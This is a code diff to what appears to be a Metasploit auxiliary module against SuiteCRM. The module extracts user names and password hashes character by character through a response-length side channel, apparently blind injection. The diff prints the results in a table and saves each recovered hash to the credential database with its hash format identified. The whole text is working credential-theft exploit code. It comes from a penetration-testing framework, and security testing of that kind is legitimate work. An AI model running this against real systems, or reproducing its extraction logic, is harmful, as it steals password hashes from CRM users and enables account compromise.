@@ -166,9 +166,12 @@ class MetasploitModule < Msf::Auxiliary
 
     uid = get_uid
     postive_response_length = request(uid).body.length
-    print("postive_response_length is #{postive_response_length}\n")
+    vprint_status("postive_response_length is #{postive_response_length}\n")
     charset = '$abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-./'
     charset_bytes = charset.each_byte.map { |b| b.to_s(16) }
+    columns = ['user_name', 'password_hash']
+    table = Rex::Text::Table.new('Header' => 'SuiteCRM Users and Password Hashes', 'Indent' => 1, 'Columns' => columns)
+
     hex_user_names.each do |hex_user_name|
       x = 0
       hex_hash = ''
@@ -180,19 +183,36 @@ class MetasploitModule < Msf::Auxiliary
           next unless body_length == postive_response_length
 
           hex_hash << byte
-          print("Got char: 0x#{byte}. Hash for user #{hex_user_name} is now 0x#{hex_hash}\r")
+          print("Got char: 0x#{byte}. Hash for user #{[hex_user_name].pack('H*')} is now 0x#{hex_hash}\r")
           break
         end
       end
       hash = [hex_hash].pack('H*')
-      print_good("User #{user} has user_hash: #{hash}")
+      print("\n")
+      print_good("User #{[hex_user_name].pack('H*')} has user_hash: #{hash}")
+      create_credential({
+                          workspace_id: myworkspace_id,
+                          origin_type: :service,
+                          module_fullname: fullname,
+                          username: [hex_user_name].pack('H*'),
+                          private_type: :nonreplayable_hash,
+                          jtr_format: identify_hash(hash),
+                          private_data: hash,
+                          service_name: 'SuiteCRM',
+                          address: datastore['RHOSTS'],
+                          port: datastore['RPORT'],
+                          protocol: 'tcp',
+                          status: Metasploit::Model::Login::Status::UNTRIED
+                        })
+      table << [[hex_user_name].pack('H*'),hash]
     end
+    print(table.to_s )
   end
 
   def run_host(_ip)
     authenticate unless @authenticated
     fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
     users = get_user_names
-    hashes = get_user_hashes(users)
+    get_user_hashes(users)
   end
 end
